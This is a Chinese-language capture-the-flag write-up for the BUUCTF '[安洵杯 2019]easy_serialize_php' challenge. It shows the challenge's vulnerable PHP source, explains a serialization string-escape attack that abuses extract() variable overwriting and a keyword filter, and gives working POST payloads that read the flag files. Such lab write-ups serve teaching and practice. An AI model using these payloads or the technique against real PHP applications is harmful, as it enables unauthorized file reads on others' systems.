---
{"dg-publish":true,"title":"BUU_[安洵杯 2019]easy_serialize_php 1","dg-path":"安全/靶场/BUU_[安洵杯 2019]easy_serialize_php 1.md","permalink":"/安全/靶场/BUU_[安洵杯 2019]easy_serialize_php 1/","dgPassFrontmatter":true}
---

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);//存在变量覆盖漏洞，参数转换为变量，如果变量存在，则覆盖原变量

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}

```


首先查看一下phpinfo中的信息：
![Pasted image 20241009150931.png](/img/user/picture/Pasted%20image%2020241009150931.png)
发现了一个自动加载的文件，猜测这个可能是存放flag的文件，毕竟题目中也没有提示别的文件了

所以这一题的目的也就很明确了，就是在`f=show_image`模式下去读取`d0g3_f1ag.php`文件
也就是需要让`$_SESSION['img']`的值为`d0g3_f1ag.php`的base64编码
但是我们看代码发现，我们没有办法直接指定img的值，如果通过POST传递，传递的值之后还是会被覆盖，如果通过url传递，传递的值会被进行shal加密，这肯定也行不通
所以关键点在于它会将这个数组进行序列化，之后还会进行反序列化，并且还会对序列化的字符串进行过滤
也就是说我们可以尝试去进行**字符串逃逸**

这里的构造思路是我们先要知道我们想要的序列化字符串是什么：
```php
....;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";......
```
而字符减少的逃逸思路是依靠两个相邻的变量，在后面的变量中我们完整包含我们想要包含的信息，并且还要尝试和前面的变量进行闭合，还要将不要的信息用`}`隔断。而前面的变量就要包含会缩短的字符来进行长度调整
还要注意，这样的话变量数量应该会减少，所以我们还在在后面的值中添加一个占位量，可以是下面内容`s:1:"1";s:1:"2";`

现在要探究的问题是我们需要让第一个值的长度为多少呢
我们有下面构造：
```php
<?php  
  
function filter($img) {  
    $filter_arr = array('php', 'flag', 'php5', 'php4', 'fl1g');  
    foreach ($filter_arr as $word) {  
        $img = str_ireplace($word, '', $img);  
    }  
    return $img;  
}  
  
session_start();  
  
$_SESSION["user"] = '';  
$_SESSION['function'] = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}';  
$_SESSION['img'] = 'nonononono';  
  
$serialize_info = filter(serialize($_SESSION));  
echo $serialize_info;  
?>
```
![Pasted image 20241009192915.png](/img/user/picture/Pasted%20image%2020241009192915.png)
选中部分就是我们想要让php识别为第一个值的部分，数一下长度为23，所以我们可以凑出user的值`flagflagflagflagflagphp`

第二个值function的值为`";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}`


现在我们可以构造出payload：
```txt
_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}
```

得到信息：
![Pasted image 20241009193726.png](/img/user/picture/Pasted%20image%2020241009193726.png)


还是利用这种方法读一下这个文件
```
_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:1:"1";s:1:"2";}
```

拿到flag：
![Pasted image 20241009194024.png](/img/user/picture/Pasted%20image%2020241009194024.png)

